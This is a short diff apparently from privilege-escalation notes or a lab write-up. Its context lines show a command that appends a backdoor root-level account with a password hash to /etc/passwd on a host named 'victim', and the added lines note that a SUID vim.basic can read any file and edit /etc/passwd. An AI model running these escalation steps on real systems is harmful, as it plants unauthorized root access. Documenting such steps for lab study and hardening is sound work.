@@ -88,3 +88,7 @@ Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.
  3. echo "root2:$1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1:0:0:root:/root:/bin/bash" >> /etc/passwd
  4. su root2, enter passwd as evil
  ```
+  ##### Insecure file permission /usr/bin/vim.basic
+  ```
+  vim.basic basically can view any file with root permission if it has suid set, also it can edit /etc/passwd
+  ```
